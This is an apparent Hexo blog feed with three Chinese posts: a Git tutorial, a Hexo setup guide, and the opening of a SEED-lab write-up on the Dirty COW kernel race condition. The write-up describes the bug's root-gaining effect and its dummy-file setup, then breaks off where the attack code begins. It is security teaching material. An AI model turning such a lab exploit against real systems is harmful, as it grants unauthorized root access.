    <content type="html"><![CDATA[<h1 id="Git-简介"><a href="#Git-简介" class="headerlink" title="Git 简介"></a>Git 简介</h1><p>Git 是一个分布式版本控制工具，最初版本由Linux之父Linus在一周之内开发完成，目的是为了解决Linux内核维护工作的代码同步（不得不感叹李纳斯简直是神啊）</p><h1 id="Git-与其他版本控制工具的差异"><a href="#Git-与其他版本控制工具的差异" class="headerlink" title="Git 与其他版本控制工具的差异"></a>Git 与其他版本控制工具的差异</h1><ul><li>别的版本控制工具侧重文件内容的具体差异</li><li>Git 关心文件数据的整体是否发生变化，把变化的文件作<code>快照</code></li><li>Git 并不保存这些前后变化的差异数据，而是对数据得到进行sha-1摘要，并将此结果作为数据的唯一标识和索引，若文件没有变化，Git 不会再次保存</li></ul><h1 id="git-使用过程"><a href="#git-使用过程" class="headerlink" title="git 使用过程"></a>git 使用过程</h1><p>创建文件夹<br><img src="https://img-blog.csdnimg.cn/4dc955984f434346956e2a12f384d34a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"><br>git init</p><p>由于刚刚初始化，此时显示On branch master，No commits yet，nothing to commit<br><img src="https://img-blog.csdnimg.cn/75be5369f0b94d0d83185350aad4f778.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"><br>创建文件并修改<br><img src="https://img-blog.csdnimg.cn/ec7e7b9e210347938b131c44820ea403.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"><br>将文件放入暂存区<br><img src="https://img-blog.csdnimg.cn/f427689f5dc84298a80a8461af55575c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"><br>提交到本地<br><img src="https://img-blog.csdnimg.cn/c6d30b319f8c4b38b60597a00cf1ba2c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h1 id="文件的几种状态"><a href="#文件的几种状态" class="headerlink" title="文件的几种状态"></a>文件的几种状态</h1><h2 id="修改（modified）"><a href="#修改（modified）" class="headerlink" title="修改（modified）"></a>修改（modified）</h2><p>修改了某个文件，但还没有提交保存</p><h2 id="暂存（staged）"><a href="#暂存（staged）" class="headerlink" title="暂存（staged）"></a>暂存（staged）</h2><p>把已修改的文件放在下次提交时要保存的清单中</p><h2 id="提交（committed）"><a href="#提交（committed）" class="headerlink" title="提交（committed）"></a>提交（committed）</h2><p>该文件已经被安全地保存在本地数据库中</p><h2 id="基本的-Git-工作流程"><a href="#基本的-Git-工作流程" class="headerlink" title="基本的 Git 工作流程"></a>基本的 Git 工作流程</h2><ul><li>在工作目录（working directory）中修改某些文件</li><li>对修改后的文件进行快照，然后保存到暂存区域（staging area）</li><li>提交更新（committed），将保存在暂存区域的文件快照永久转储到 Git 目录中</li></ul><p>下面是工作目录，暂存区域，以及本地仓库三者之间的关系<br><img src="https://img-blog.csdnimg.cn/81cb8dd07b1f48fba59ee63b7abcf72a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_13,color_FFFFFF,t_70,g_se,x_16"></p><h1 id="git-add"><a href="#git-add" class="headerlink" title="git add"></a>git add</h1><p> git add 命令，根据目标文件的状态不同，此命令的效果也不同</p><ul><li>可以用它开始跟踪新文件</li><li>把已跟踪的文件放到暂存区</li><li>还能用于合并时把有冲突的文件标记为已解决状态</li></ul><p><strong>告诉 Git 开始对这些文件进行跟踪</strong></p><p>tracked 、 untracked分别标识跟踪/不跟踪。对于每个文件，都只能处于这两种状态的其中一种</p><p>几个要注意的点：</p><ul><li>已跟踪的文件是指被纳入版本控制管理的文件</li><li>未被跟踪的文件是指不被纳入版本控制管理的文件</li><li>要确定哪些文件当前处于什么状态，可以用 git status 命令，若是 nothing to commit (working directory clean)，则标识你现在的工作目录相当干净。换句话说，所有已跟踪文件在上次提交后都未被更改过</li></ul><p><img src="https://img-blog.csdnimg.cn/c4d6d782124d450ba9870ee974597ac0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_13,color_FFFFFF,t_70,g_se,x_16"></p><h1 id="git-status"><a href="#git-status" class="headerlink" title="git status"></a>git status</h1><p>要确定哪些文件当前处于什么状态，可以用 git status 命令，若是 nothing to commit (working directory clean)，则标识你现在的工作目录相当干净。换句话说，所有已跟踪文件在上次提交后都未被更改过</p><h1 id="git-diff"><a href="#git-diff" class="headerlink" title="git diff"></a>git diff</h1><p> git status 的显示仅仅是列出了修改过的文件，如果要查看具体修改了什么地方，可以用 git diff 命令</p><ul><li>git diff：此命令比较的是工作目录中当前文件和暂存区域快照之间的差异，也就是修改之后还没有暂存起来的变化内容</li><li>git diff –staged：已经暂存起来的文件和上次提交时的快照之间的差异</li></ul><h1 id="git-ignore"><a href="#git-ignore" class="headerlink" title="git ignore"></a>git ignore</h1><p>写在git ignore中的文件无需纳入 Git 的管理，比如说，在目录下创建.gitignore文件，然后在文件中写入：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">*.<span class="hljs-keyword">c</span>    忽略所有的<span class="hljs-keyword">c</span>结尾的文件<br><span class="hljs-title">!wdnmd.c</span> 文件wdnm.<span class="hljs-keyword">c</span>不放入忽略沐浴露<br>/nmsl只忽略项目根目录下的 nmsl文件，子目录下的nmsl文件不受影响<br></code></pre></td></tr></table></figure><h1 id="git-clone"><a href="#git-clone" class="headerlink" title="git clone"></a>git clone</h1><p>git clone命令可以复制一个现有仓库，且仓库中包含所有的历史版本</p><p>下面是几个常用的实际情景</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">通过HTTPS的方式<br><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> https://github.com/richardchien/modern-cmake-by-example.git</span><br><br>通过ssh的方式<br><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> git@github.com:richardchien/modern-cmake-by-example.git</span><br><br>通过ssh的方式，并且将本地的目录名命名为 wdnmd<br><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> git@github.com:richardchien/modern-cmake-by-example.git wdnmd</span> <br><br>通过ssh的方式，且要克隆的是某个服务器上的git目录仓库<br><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> user@server:/path.git</span> <br><br><br><br><br></code></pre></td></tr></table></figure><h1 id="git-commit"><a href="#git-commit" class="headerlink" title="git commit"></a>git commit</h1><ul><li>直接输入git commit，这种方式会启动文本编辑器以便输入本次提交的说明，编辑器是Vim</li><li>git commit -m “xxxx”，这种方式表示本次提交说明是引号中的xxx</li><li>git commit -a -m ‘xxxx’ 这种方式跳过git add的过程直接将所有文件加入到暂存区然后提交</li></ul><h1 id="git-log"><a href="#git-log" class="headerlink" title="git log"></a>git log</h1><p>该命令会打印出所有的提交历史，会按提交时间列出所有的更新，最近的更新排在最上面，每次更新都有一个 SHA-1 校验和、作者的名字和电子邮件地址、提交时间，最后缩进一个段落显示提交说明</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">log</span> -p -2</span><br></code></pre></td></tr></table></figure><p>-p 选项展开显示每次提交的内容差异<br>-2 则仅显示最近的两次更新：</p><h1 id="git-push"><a href="#git-push" class="headerlink" title="git push"></a>git push</h1><p>git push 是用来将本地仓库中的数据推送到远程仓库</p><p>如果要把本地的 master 分支推送到 origin 服务器上，可以使用以下语句：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git push [remote-name] [branch-name]<br></code></pre></td></tr></table></figure><h1 id="git-分支"><a href="#git-分支" class="headerlink" title="git 分支"></a>git 分支</h1><p>//TODO</p><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="https://img-blog.csdnimg.cn/b7e61a1b29db4f1f97c7d26ea44b5c5a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>该图来自微信公众号：绯浅yousa</p><h1 id="Git资料推荐"><a href="#Git资料推荐" class="headerlink" title="Git资料推荐"></a>Git资料推荐</h1><p>网页在线资料</p><ul><li><a href="https://ohshitgit.com/">ohshitgit</a></li><li><a href="https://gitee.com/progit/index.html">Pro Git（中文版）</a></li><li><a href="https://github.com/geeeeeeeeek/git-recipes">git-recipes</a></li></ul><p>书籍</p><ul><li>Github入门与实践</li><li>Git团队协作</li></ul><p>可视化的 Git 在线学习网站</p><ul><li><a href="https://learngitbranching.js.org/?locale=zh_CN">learngit</a></li></ul><p><a href="https://eagain.net/articles/git-for-computer-scientists/">https://eagain.net/articles/git-for-computer-scientists/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo博客配置 all in one</title>
    <link href="/p/19ab6481/"/>
    <url>/p/19ab6481/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/hexo.jpeg"></p><p>本文记录了我基于hexo构建的博客的一些配置</p><h1 id="博客迁移、多设备写作"><a href="#博客迁移、多设备写作" class="headerlink" title="博客迁移、多设备写作"></a>博客迁移、多设备写作</h1><h2 id="安装-hexo"><a href="#安装-hexo" class="headerlink" title="安装 hexo"></a>安装 hexo</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">brew install git<br><br>brew install node<br><br>npm install -g hexo-cli<br></code></pre></td></tr></table></figure><ul><li>下载nodejs<ul><li>建议使用scoop下载</li></ul></li><li>使用npm下载hexo<ul><li><code>npm install -g hexo-cli</code></li></ul></li></ul><p>命令行进入到C:\hexo目录</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">hexo <span class="hljs-built_in">n</span> <span class="hljs-string">&quot;&quot;</span><br>hexo d -g<br></code></pre></td></tr></table></figure><h2 id="压缩包"><a href="#压缩包" class="headerlink" title="压缩包"></a>压缩包</h2><p>直接复制粘贴会破坏修改日期，导致博客文章乱序，把整个文件夹打成压缩包可以避免修改日期的变化</p><p>步骤：将原先电脑的hexo文件夹打成压缩包，然后复制到新电脑，解压（比如C:\hexo目录）</p><blockquote><p>这里不直接复制的原因是，会改变博客文件的最近修改时间，从而导致顺序混乱</p></blockquote><h1 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h1><p>typora</p><ul><li>设置font matter，也即是两行<code>---</code>框起来的代码<br><a href="#emoji">hexo博客配置 all in one</a>```c</li></ul><hr><p>title: hexo博客配置<br>tags: [hexo]<br>typora-root-url: ../<br>abbrlink: 19ab6481<br>index_img: /image/hexo.jpeg<br>categories: </p><hr><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs awk">- 设置picgo上传图片<br><br>obsidian<br>- 配置主题（默认主题实在是太丑了）<br>- 推荐minimal和Blue Topaz<br>- 搭配style setting插件可以定制一下主题<br>- 配置图片路径<br>- 设置-》新建笔记的存放位置-》当前文件所在的文件夹<br>- 设置-》核心插件-》打开工作区、斜杠命令<br>- open 已存在的文件夹(也即是_post文件夹)，如果打开的是hexo根文件夹那么图片无法正常显示<br>- 模板功能：在_post文件夹下新建一个template文件夹，创建文件并在其中写入你想快速插入的内容，这样在新建文件之后可以快速生成模板内容，从而避免命令行运行hexo n “title”命令<br><br>我的ob的效果：<br>![](https:<span class="hljs-regexp">//img</span>.gls.show<span class="hljs-regexp">/img/</span><span class="hljs-number">20230810160851</span>.png)<br><br><span class="hljs-comment"># 评论功能</span><br><br>可以使用多种插件支持博客评论功能，比如：<br>- [Valine (opens new window)](https:<span class="hljs-regexp">//</span>valine.js.org/configuration.html):基于 LeanCloud<br>- [Waline (opens new window)](https:<span class="hljs-regexp">//</span>waline.js.org/): 从 Valine 衍生而来，额外增加了服务端和多种功能<br>- [Gitalk (opens new window)](https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/gitalk/gi</span>talk): 基于 GitHub Issues<br>- [Utterances (opens new window)](https:<span class="hljs-regexp">//u</span>tteranc.es/): 基于 GitHub Issues<br><br>我选择了utterances~~因为比较简单~~<br><br><span class="hljs-comment">## 部署步骤</span><br><br><span class="hljs-number">1</span>.安装utterances<br>安装页面：[GitHub Apps - utterances · GitHub](https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/apps/u</span>tterances)，选择你的github仓库即可<br><br><span class="hljs-number">2</span>.更改fluid配置<br><br>[配置指南 | Hexo Fluid 用户手册](https:<span class="hljs-regexp">//</span>hexo.fluid-dev.com<span class="hljs-regexp">/docs/gui</span>de/<span class="hljs-comment">#%E5%8D%9A%E5%AE%A2%E6%A0%87%E9%A2%98)</span><br><br>```yaml<br>  <span class="hljs-comment"># 评论插件</span><br>  <span class="hljs-comment"># Comment plugin</span><br>  comments:<br>    enable: true <span class="hljs-comment"># change into true</span><br>    <span class="hljs-comment"># 指定的插件，需要同时设置对应插件的必要参数</span><br>    <span class="hljs-comment"># The specified plugin needs to set the necessary parameters at the same time</span><br>    <span class="hljs-comment"># Options: utterances | disqus | gitalk | valine | waline | changyan | livere | remark42 | twikoo | cusdis</span><br>    type: utterances<br><br><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-comment"># 评论插件</span><br><span class="hljs-comment"># Comment plugins</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 开启评论需要先设置上方 `post: comments: enable: true`，然后根据 `type` 设置下方对应的评论插件参数</span><br><span class="hljs-comment"># Enable comments need to be set `post: comments: enable: true`, then set the corresponding comment plugin parameters below according to `type`</span><br><span class="hljs-comment">#---------------------------</span><br><br><span class="hljs-comment"># Utterances</span><br><span class="hljs-comment"># 基于 GitHub Issues</span><br><span class="hljs-comment"># Based on GitHub Issues</span><br><span class="hljs-comment"># See: https://utteranc.es</span><br>utterances:<br>  repo: LaPhilosophie/gls.show <span class="hljs-comment"># add repo info</span><br>  issue_term: pathname<br>  label: utterances<br>  theme: github-light<br>  theme_dark: github-dark<br>  crossorigin: anonymous<br><br></code></pre></td></tr></table></figure><h1 id="图片外链"><a href="#图片外链" class="headerlink" title="图片外链"></a>图片外链</h1><p>给博客生成图片外链是一个比较头疼的事情，一般的常规做法是部署一个图床服务，把图片上床到图床，然后将图片链接复制到博客中</p><p>比如：</p><ul><li>使用七牛云+picgo的组合</li><li>使用lychee等图床部署在自己的服务器上，生成外链</li></ul><p>但是一旦迁移服务器或者更换域名，外链都会挂掉</p><p>我的个人配置是，在每个md文件开头写上：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">typora-root-url: ../<br><br>index_img: <span class="hljs-regexp">/image/</span>wdnmd.jpg<br></code></pre></td></tr></table></figure><p>这样就可以使用上一个目录的文件夹/image下的wdnmd.jpg的图片</p><p>2023-6-13图片外链更新：</p><p>使用腾讯云对象存储+PicGo+typora</p><ul><li>腾讯云：配置cdn、ssl、证书、域名、存储桶等，按照腾讯云官网的文档即可（这个证书认证和cdn还是比较蛋疼的）</li><li>PicGo：安装并配置客户端</li><li>typora：插入图片时上传图片</li></ul><p><img src="https://img.gls.show/img/20230816112629.png"></p><p>相关的id和key信息可以在控制台看到：</p><ul><li><a href="https://console.cloud.tencent.com/cam/capi">https://console.cloud.tencent.com/cam/capi</a></li><li><a href="https://console.cloud.tencent.com/cos/bucket">https://console.cloud.tencent.com/cos/bucket</a></li></ul><h1 id="文章外链优化"><a href="#文章外链优化" class="headerlink" title="文章外链优化"></a>文章外链优化</h1><p>hexo默认的文章链接是域名/年/月/日，复制之后由于汉字转义会有很长的乱码出现，不利于阅读</p><p>可以使用<a href="https://github.com/Rozbo/hexo-abbrlink">插件</a>解决</p><p>修改<code>_config.yml</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">permalink: p/:abbrlink/<br><br>abbrlink:<br>  alg: crc32  #算法: crc16(<span class="hljs-keyword">default</span>) <span class="hljs-keyword">and</span> crc32<br>  rep: hex    #进制: dec(<span class="hljs-keyword">default</span>) <span class="hljs-keyword">and</span> hex<br></code></pre></td></tr></table></figure><p>优化后的博客链接：<a href="https://gls.show/p/f9220a0b/">https://gls.show/p/f9220a0b/</a></p><h1 id="配置网站ssl"><a href="#配置网站ssl" class="headerlink" title="配置网站ssl"></a>配置网站ssl</h1><p>腾讯云控制台-》申请免费证书-》我的证书-》下载-》选择nginx-》将gls.show.key和gls.show_bundle.crt文件通过scp或者filezilla复制到/etc/nginx目录下-》sudo nginx -s reload或者sudo service nginx restart</p><h1 id="seo优化"><a href="#seo优化" class="headerlink" title="seo优化"></a>seo优化</h1><p>生成sitemap</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">npm <span class="hljs-keyword">install </span>hexo-generator-sitemap --save<br>npm <span class="hljs-keyword">install </span>hexo-generator-<span class="hljs-keyword">baidu-sitemap </span>--save<br></code></pre></td></tr></table></figure><h1 id="将博客同时推送到两个git"><a href="#将博客同时推送到两个git" class="headerlink" title="将博客同时推送到两个git"></a>将博客同时推送到两个git</h1><p>可参考官方手册：<a href="https://hexo.io/docs/one-command-deployment">https://hexo.io/docs/one-command-deployment</a></p><p>You can use multiple deployers. Hexo will execute each deployer in order.</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repository :</span> <span class="hljs-string">git@gls.show:xx/hexo.git</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repository :</span> <span class="hljs-string">git@github.com:LaPhilosophie/blog.git</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br></code></pre></td></tr></table></figure><h1 id="发表博客"><a href="#发表博客" class="headerlink" title="发表博客"></a>发表博客</h1><p>新建博客</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">hexo <span class="hljs-built_in">n</span> <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>本地测试</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo s</span><br></code></pre></td></tr></table></figure><p>创建静态页面</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo g</span><br></code></pre></td></tr></table></figure><p>部署页面</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo d</span><br></code></pre></td></tr></table></figure><h1 id="设置文章属性"><a href="#设置文章属性" class="headerlink" title="设置文章属性"></a>设置文章属性</h1><p>是否可见：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">hide</span>: <span class="hljs-keyword">false</span>/<span class="hljs-keyword">true</span><br></code></pre></td></tr></table></figure><p>设置置顶：<br>可以在文章开头 Front-matter (opens new window)中配置 sticky 属性。sticky 数值越大，该文章越靠前，达到类似于置顶的效果，其他未设置的文章依然按默认排序</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sticky</span>: <span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><h1 id="免密部署"><a href="#免密部署" class="headerlink" title="免密部署"></a>免密部署</h1><p>将<code>wdnmd.pub</code>放在git用户的.ssh文件夹下的authorized_keys中</p><p>本地：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">eval</span> $(ssh-agent)<br><br>ssh-add ~<span class="hljs-regexp">/.ssh/</span>wdnmd<br></code></pre></td></tr></table></figure><h1 id="emoji"><a href="#emoji" class="headerlink" title="emoji"></a>emoji</h1><ul><li><p>想要在博客中插入emoji，可以使用网站<a href="https://emoji.muan.co/">https://emoji.muan.co/</a></p><ul><li>该网站已被墙😅</li></ul></li><li><p>曾尝试过Markdown自带的emoji，在你本地的md文件中是可以看到的，但是在网页中无法显示</p></li></ul><p>emoji.muan.co 效果测试：</p><p>🚠🚅✈️🚒</p><h1 id="增加网页js"><a href="#增加网页js" class="headerlink" title="增加网页js"></a>增加网页js</h1><p>比如增加动态彩带效果：</p><p>在_config.fluid中添加</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/caidai.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在<code>Hexo\source\js</code>文件夹中增加<code>caidai.js</code>文件，写入<a href="https://cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js">网址中内容</a></p><h1 id="使用-vscode-写Markdown"><a href="#使用-vscode-写Markdown" class="headerlink" title="使用 vscode 写Markdown"></a>使用 vscode 写Markdown</h1><ul><li>安装插件：Markdown image 、Markdown preview</li><li>更改图片目录为../image</li><li>在hexo/source目录打开vscode，不可以在_post目录打开vscode，否则无法显示图片</li></ul><h1 id="写文章原则"><a href="#写文章原则" class="headerlink" title="写文章原则"></a>写文章原则</h1><ul><li>多文字、少图</li><li>用ASCII替代图<ul><li><a href="https://asciiflow.com/">https://asciiflow.com/</a></li><li><a href="https://textik.com/">https://textik.com/</a></li></ul></li></ul><h1 id="踩到的坑"><a href="#踩到的坑" class="headerlink" title="踩到的坑"></a>踩到的坑</h1><ul><li>报错：<code>fatal: not a git repository (or any of the parent directories): .git</code>。解决方案：删除hexo目录下的.deploy_git文件夹</li><li>md文件开头的几个选项，比如<code>tags:</code>后面要留一个空格才可以正确解析，不然会导致无法部署</li><li>出现如下报错：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">kex_exchange_identification: Connection closed by remote host<br>Connection closed by <span class="hljs-number">20.205</span><span class="hljs-number">.243</span><span class="hljs-number">.166</span> port <span class="hljs-number">22</span><br>fatal: Could <span class="hljs-keyword">not</span> read from remote repository.<br>Please make sure you have the correct access rights<br><span class="hljs-keyword">and</span> the repository exists.<br><br>FATAL &#123;<br>  err: Error: Spawn failed<br>      at ChildProcess.&lt;anonymous&gt; (C:\Hexo\node_modules\hexo-util\lib\spawn.js:<span class="hljs-number">51</span>:<span class="hljs-number">21</span>)<br>      at ChildProcess.emit (node:events:<span class="hljs-number">390</span>:<span class="hljs-number">28</span>)<br>      at ChildProcess.cp.emit (C:\Hexo\node_modules\cross-spawn\lib\enoent.js:<span class="hljs-number">34</span>:<span class="hljs-number">29</span>)<br>      at Process.ChildProcess._handle.onexit (node:internal/child_process:<span class="hljs-number">290</span>:<span class="hljs-number">12</span>) &#123;<br>    code: <span class="hljs-number">128</span><br>  &#125;<br>&#125; Something<span class="hljs-number">&#x27;</span>s wrong. Maybe you can find the solution here: %s https:<span class="hljs-comment">//hexo.io/docs/troubleshooting.html</span><br></code></pre></td></tr></table></figure><ul><li>解决：在<code>~/.ssh/config</code>中如下配置：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">Host github.com<br>Hostname ssh.github.com<br>IdentityFile <span class="hljs-string">&quot;C:\Users\GuoJiaming\.ssh\wdnmd&quot;</span><br>Port <span class="hljs-number">443</span><br></code></pre></td></tr></table></figure><h1 id="导航栏颜色"><a href="#导航栏颜色" class="headerlink" title="导航栏颜色"></a>导航栏颜色</h1></li></ul></li></ul><p> navbar_bg_color: “#153b6e”</p><h1 id="博客留言板"><a href="#博客留言板" class="headerlink" title="博客留言板"></a>博客留言板</h1><p>//todo</p><h1 id="一些参考"><a href="#一些参考" class="headerlink" title="一些参考"></a>一些参考</h1><p><a href="https://bbs.huaweicloud.com/blogs/226867">https://bbs.huaweicloud.com/blogs/226867</a><br><a href="https://emoryhuang.cn/blog/1729600336.html">https://emoryhuang.cn/blog/1729600336.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：Dirty Cow</title>
    <link href="/p/495b96e/"/>
    <url>/p/495b96e/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="脏牛漏洞介绍"><a href="#脏牛漏洞介绍" class="headerlink" title="脏牛漏洞介绍"></a>脏牛漏洞介绍</h1><blockquote><p>脏牛，也即dirty COW（copy on write）</p></blockquote><p>Dirty COW 漏洞属于竞态条件漏洞，自2007年9月以来一直存在于 Linux 内核中，并于2016年10月被发现，该漏洞影响所有基于 Linux 的操作系统，包括 Android，其后果非常严重: 攻击者可以通过利用该漏洞获得root特权</p><p>该漏洞存在于 Linux 内核中的写时拷贝代码中。通过利用这个漏洞，攻击者可以修改任何受保护的文件，即使这些文件只对他们可读</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h1 id="攻击dummy-file"><a href="#攻击dummy-file" class="headerlink" title="攻击dummy file"></a>攻击dummy file</h1><p>创建dummy file，并写入内容111111222222333333</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo touch /zzz<br>sudo chmod 644 /zzz<br>sudo gedit /zzz<br></code></pre></td></tr></table></figure><p>我们的目标是将“222222”替换为“ * * * * * *”</p><p>攻击代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 